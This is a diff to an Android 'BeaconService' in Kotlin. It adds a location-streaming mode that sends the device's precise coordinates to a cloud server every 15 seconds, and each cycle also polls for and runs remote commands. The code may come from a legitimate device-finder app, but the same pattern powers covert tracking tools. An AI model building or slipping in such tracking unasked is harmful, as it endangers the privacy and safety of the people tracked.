@@ -20,26 +20,36 @@ class BeaconService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         val durationMins = intent?.getLongExtra("duration_mins", 5L) ?: 5L
+        val mode = intent?.getStringExtra("mode") ?: "BURST"
         val endTime = System.currentTimeMillis() + (durationMins * 60 * 1000)
         
-        // BURST MODE: Check every 5 seconds while active
-        intervalSeconds = 5L 
+        intervalSeconds = if (mode == "LOCATION_STREAM") 15L else 5L 
 
         startForeground(9999, createNotification())
         
         scope.launch {
-            DebugLogger.log("BEACON", "Starting Burst Mode ($durationMins mins)")
+            DebugLogger.log("BEACON", "Mode: $mode | Duration: ${durationMins}m")
+            val fused = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(applicationContext)
+
             while (isActive) {
                 if (System.currentTimeMillis() > endTime) {
-                    DebugLogger.log("BEACON", "Session Expired. Going dark.")
                     stopSelf()
                     break
                 }
 
-                // 1. Send Heartbeat
-                CloudManager.sendPing(applicationContext, "Burst Mode ($durationMins min left)")
-                
-                // 2. CHECK FOR COMMANDS INSTANTLY
+                val extra = JSONObject()
+                if (mode == "LOCATION_STREAM" && PermissionManager.hasBackgroundLocation(applicationContext)) {
+                    try {
+                        val loc = kotlinx.coroutines.tasks.await(fused.getCurrentLocation(com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, null))
+                        if (loc != null) {
+                            val locObj = JSONObject()
+                            locObj.put("lat", loc.latitude); locObj.put("lon", loc.longitude); locObj.put("acc", loc.accuracy)
+                            extra.put("stream_location", locObj)
+                        }
+                    } catch (e: Exception) { }
+                }
+
+                CloudManager.sendPing(applicationContext, "$mode (${(endTime - System.currentTimeMillis())/60000}m left)", extra)
                 CommandProcessor.checkAndExecute(applicationContext)
                 
                 delay(intervalSeconds * 1000)
